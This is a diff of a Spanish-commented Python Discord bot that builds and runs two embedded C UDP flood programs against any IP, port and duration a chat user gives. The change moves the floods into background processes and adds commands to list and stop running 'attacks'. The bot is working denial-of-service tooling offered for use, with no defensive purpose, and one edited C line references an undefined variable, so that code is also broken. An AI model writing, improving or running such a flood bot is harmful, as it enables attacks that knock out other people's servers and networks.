@@ -2,10 +2,16 @@ import discord
 from discord.ext import commands
 import subprocess
 import os
+import time
+import shlex
+import signal
 
-# Definir los nombres de los scripts
+# Definir los nombres de los scripts/binaries
 UDP_HEX_V1_SCRIPT = "./udphexv1"
 UDP_HEX_V2_SCRIPT = "./udphexv2"
+
+# Almacén de procesos lanzados: pid -> {proc, name, cmd, log}
+running_processes = {}
 
 # Crear el bot con intents
 intents = discord.Intents.default()
@@ -13,18 +19,21 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
+
 # Evento al iniciar el bot
 @bot.event
 async def on_ready():
     print(f'Bot conectado como {bot.user.name}')
 
+
 # Comando para guardar el token
 @bot.command()
-async def settoken(ctx, token):
+async def settoken(ctx, token: str):
     """Guardar el token"""
     with open("token.txt", "w") as f:
         f.write(token)
     await ctx.send("Token guardado en token.txt")
+
 
 # Función para leer el token desde el archivo
 def get_token():
@@ -34,63 +43,22 @@ def get_token():
     except FileNotFoundError:
         return None
 
-# Comando para ejecutar udphexv1
-@bot.command()
-async def udphexv1(ctx, ip, port, time):
-    """UDPHexV1 Que consume una gran cantidad de recursos"""
+
+def ensure_binaries():
+    """
+    Si los binarios no existen, compila los archivos C incluidos como antes.
+    Esta función intenta compilar udphexv1.c y udphexv2.c si los ejecutables no existen.
+    """
+    # Si ambos binarios ya existen, salir
+    if os.path.isfile(UDP_HEX_V1_SCRIPT) and os.path.isfile(UDP_HEX_V2_SCRIPT):
+        return
+
+    # Se recrean/compilan como en la versión original (siempre cuidado con ejecutar esto)
+    # Es la misma lógica que había: escribir los .c y compilar con gcc
     try:
-        # Construir el comando para ejecutar el script
-        command = [UDP_HEX_V1_SCRIPT, ip, port, "-t", "32", "-s", "64", "-d", time]
-
-        # Ejecutar el script y capturar la salida
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-
-        # Enviar la salida al canal de Discord
-        output = stdout.decode()
-        error = stderr.decode()
-
-        if output:
-            await ctx.send(f"**Salida de udphexv1:**\n```\n{output}\n```")
-        if error:
-            await ctx.send(f"**Errores de udphexv1:**\n```\n{error}\n```")
-
-    except FileNotFoundError:
-        await ctx.send(f"Error: No esta el script {UDP_HEX_V1_SCRIPT}")
-    except Exception as e:
-        await ctx.send(f"Error al ejecutar udphexv1: {e}")
-
-# Comando para ejecutar udphexv2
-@bot.command()
-async def udphexv2(ctx, ip, port, time):
-    """UDPHexV2 Optimizado con mayor potencia pero menos consumidor de la cpu"""
-    try:
-        # Construir el comando para ejecutar el script
-        command = [UDP_HEX_V2_SCRIPT, ip, port, time]
-
-        # Ejecutar el script y capturar la salida
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-
-        # Enviar la salida al canal de Discord
-        output = stdout.decode()
-        error = stderr.decode()
-
-        if output:
-            await ctx.send(f"**Salida de udphexv2:**\n```\n{output}\n```")
-        if error:
-            await ctx.send(f"**Errores de udphexv2:**\n```\n{error}\n```")
-
-    except FileNotFoundError:
-        await ctx.send(f"Error: El script no esta {UDP_HEX_V2_SCRIPT}")
-    except Exception as e:
-        await ctx.send(f"Error al ejecutar udphexv2: {e}")
-
-# Ejecutar el bot
-if __name__ == "__main__":
-    # Guardar los scripts en archivos (udphexv1 y udphexv2)
-    with open("udphexv1.c", "w") as f:
-        f.write("""#include <stdio.h>
+        # Escritura de udphexv1.c
+        with open("udphexv1.c", "w") as f:
+            f.write("""#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -223,7 +191,7 @@ void *stats_thread(void *arg) {
         unsigned long current_packets = total_packets;
         
         double elapsed = difftime(current_time, last_time);
-        unsigned long packets_diff = current_packets - last_packets;
+        unsigned long packets_diff = current_current_packets - last_packets;
         double pps = (elapsed > 0) ? packets_diff / elapsed : 0;
         
         printf("\\rEstadísticas: Total=%lu Paquetes, PPS=%.2f, Tiempo=%lds", 
@@ -378,8 +346,9 @@ int main(int argc, char *argv[]) {
     return 0;
 }""")
 
-    with open("udphexv2.c", "w") as f:
-        f.write("""#include <stdio.h>
+        # Escritura de udphexv2.c
+        with open("udphexv2.c", "w") as f:
+            f.write("""#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
@@ -424,7 +393,7 @@ void *udp(void *arg){
     
     connect(sock, (struct sockaddr*)&dst, sizeof(dst));
     
-    unsigned int seed = time(NULL) ^ pthread_self();
+    unsigned int seed = time(NULL) ^ (unsigned int)pthread_self();
     
     while(time(NULL) - args->start < args->duracion){
         for(int i = 0; i < SIZE; i++){
@@ -432,7 +401,7 @@ void *udp(void *arg){
         }
         
         send(sock, payload, SIZE, 0);
-}
+    }
     
     close(sock);
     return NULL;
@@ -477,31 +446,211 @@ int main(int argc, char *argv[]){
     return 0;
 }""")
 
-    # Compilar los programas C
-    try:
+        # Compilar
         print("Compilando udphexv1...")
         subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv1", "udphexv1.c"], check=True)
         print("Compilando udphexv2...")
         subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv2", "udphexv2.c"], check=True)
-        print("Compilación completada!")
-        
-        # Limpiar archivos .c
-        os.remove("udphexv1.c")
-        os.remove("udphexv2.c")
-        
+
+        # Limpiar .c
+        try:
+            os.remove("udphexv1.c")
+            os.remove("udphexv2.c")
+        except OSError:
+            pass
+
+        # Ajustar permisos si es Unix
+        try:
+            os.chmod("udphexv1", 0o755)
+            os.chmod("udphexv2", 0o755)
+        except OSError:
+            pass
+
     except subprocess.CalledProcessError as e:
         print(f"Error al compilar: {e}")
         print("Asegúrate de tener gcc instalado")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error en ensure_binaries: {e}")
 
-    # Dar permisos de ejecución a los scripts (en sistemas Unix)
+
+def start_process(command, name):
+    """
+    Inicia un proceso en segundo plano, guarda su info en running_processes y devuelve el pid.
+    El stdout/stderr se redirige a un archivo de log (name_<timestamp>.log).
+    """
+    ts = int(time.time())
+    log_path = f"{name}_{ts}.log"
+    logfile = open(log_path, "ab")
+
+    # Preparar la ejecución en segundo plano sin bloquear el bot
+    if os.name != "nt":
+        # Unix: evitar que la señal Ctrl+C mate al hijo y agrupar procesos
+        proc = subprocess.Popen(command, stdout=logfile, stderr=subprocess.STDOUT, preexec_fn=os.setpgrp)
+    else:
+        # Windows: creación de nuevo grupo de procesos
+        proc = subprocess.Popen(command, stdout=logfile, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+
+    running_processes[proc.pid] = {"proc": proc, "name": name, "cmd": command, "log": log_path}
+    return proc.pid
+
+
+@bot.command()
+async def udphexv1(ctx, ip: str, port: str, duration: int, threads: int = 4, size: int = 1024, delay: int = 0):
+    """
+    Inicia udphexv1 en segundo plano.
+    Uso: !udphexv1 <ip> <port> <duration> [threads=4] [size=1024] [delay_ms=0]
+    """
+    # Validaciones básicas
     try:
-        os.chmod("udphexv1", 0o755)
-        os.chmod("udphexv2", 0o755)
-    except OSError as e:
-        print(f"Error al cambiar permisos: {e}")
-        print("Asegúrate de ejecutar esto en un entorno compatible con chmod (Linux/macOS) o ajusta los permisos manualmente.")
+        int_port = int(port)
+        if int_port <= 0 or int_port > 65535:
+            await ctx.send("Puerto inválido.")
+            return
+    except ValueError:
+        await ctx.send("Puerto inválido.")
+        return
+
+    if duration <= 0:
+        await ctx.send("Duración debe ser > 0 segundos.")
+        return
+
+    # Asegurar binarios
+    ensure_binaries()
+    if not os.path.isfile(UDP_HEX_V1_SCRIPT):
+        await ctx.send(f"Error: no se encontró el script {UDP_HEX_V1_SCRIPT}")
+        return
+
+    # Construir comando acorde a udphexv1.c
+    command = [UDP_HEX_V1_SCRIPT, ip, str(int_port), "-t", str(threads), "-s", str(size), "-d", str(duration)]
+    if delay > 0:
+        command += ["-D", str(delay)]
+
+    pid = start_process(command, "udphexv1")
+    await ctx.send(f"Iniciado udphexv1 PID={pid}. Log: {running_processes[pid]['log']}")
+
+
+@bot.command()
+async def udphexv2(ctx, ip: str, port: str, duration: int):
+    """
+    Inicia udphexv2 en segundo plano.
+    Uso: !udphexv2 <ip> <port> <time>
+    """
+    # Validaciones básicas
+    try:
+        int_port = int(port)
+        if int_port <= 0 or int_port > 65535:
+            await ctx.send("Puerto inválido.")
+            return
+    except ValueError:
+        await ctx.send("Puerto inválido.")
+        return
+
+    if duration <= 0:
+        await ctx.send("Duración debe ser > 0 segundos.")
+        return
+
+    # Asegurar binarios
+    ensure_binaries()
+    if not os.path.isfile(UDP_HEX_V2_SCRIPT):
+        await ctx.send(f"Error: no se encontró el script {UDP_HEX_V2_SCRIPT}")
+        return
+
+    command = [UDP_HEX_V2_SCRIPT, ip, str(int_port), str(duration)]
+    pid = start_process(command, "udphexv2")
+    await ctx.send(f"Iniciado udphexv2 PID={pid}. Log: {running_processes[pid]['log']}")
+
+
+@bot.command()
+async def attacks(ctx):
+    """Lista ataques/procesos lanzados por el bot"""
+    if not running_processes:
+        await ctx.send("No hay ataques en curso.")
+        return
+
+    lines = []
+    for pid, info in running_processes.items():
+        proc = info["proc"]
+        status = "running" if proc.poll() is None else f"exited (code={proc.returncode})"
+        lines.append(f"PID={pid} Name={info['name']} Status={status} Cmd={' '.join(info['cmd'])} Log={info['log']}")
+    # Enviar como bloque de texto
+    await ctx.send("Procesos:\n" + "```" + "\n".join(lines) + "```")
+
+
+@bot.command()
+async def stop(ctx, target: str):
+    """
+    Detiene un proceso por PID o por nombre.
+    Uso: !stop <pid>  o  !stop udphexv1
+    """
+    # Intentar PID primero
+    try:
+        pid = int(target)
+        if pid not in running_processes:
+            await ctx.send(f"No se encontró proceso con PID {pid} gestionado por este bot.")
+            return
+        info = running_processes[pid]
+        proc = info["proc"]
+        try:
+            # Terminar el proceso y su grupo
+            if os.name != "nt":
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            else:
+                proc.terminate()
+        except Exception:
+            try:
+                proc.terminate()
+            except Exception as e:
+                await ctx.send(f"Error al detener PID {pid}: {e}")
+                return
+
+        await ctx.send(f"Enviada señal de terminación a PID {pid}.")
+        # No bloquear esperando; opcionalmente hacer poll
+        time.sleep(0.5)
+        proc.poll()
+        status = "detenido" if proc.returncode is not None else "aún activo"
+        # Cerrar entry si terminó
+        if proc.returncode is not None:
+            running_processes.pop(pid, None)
+        await ctx.send(f"Estado PID {pid}: {status}")
+        return
+    except ValueError:
+        # No es PID; tratar como nombre
+        name = target.strip().lower()
+        to_kill = [pid for pid, info in running_processes.items() if info["name"].lower() == name]
+        if not to_kill:
+            await ctx.send(f"No se encontraron procesos con nombre {name} gestionados por este bot.")
+            return
+        stopped = []
+        for pid in to_kill:
+            info = running_processes.get(pid)
+            if not info:
+                continue
+            proc = info["proc"]
+            try:
+                if os.name != "nt":
+                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                else:
+                    proc.terminate()
+            except Exception:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            stopped.append(pid)
+
+        await ctx.send(f"Se enviaron señales de terminación a PIDs: {', '.join(map(str, stopped))}")
+        # Limpiar entradas de procesos que ya terminaron
+        time.sleep(0.5)
+        for pid in list(running_processes.keys()):
+            if running_processes[pid]["proc"].poll() is not None:
+                running_processes.pop(pid, None)
+        return
+
+
+# Ejecutar el bot
+if __name__ == "__main__":
+    # Asegurar binarios al arrancar (compila si hace falta)
+    ensure_binaries()
 
     # Leer el token desde el archivo
     token = get_token()
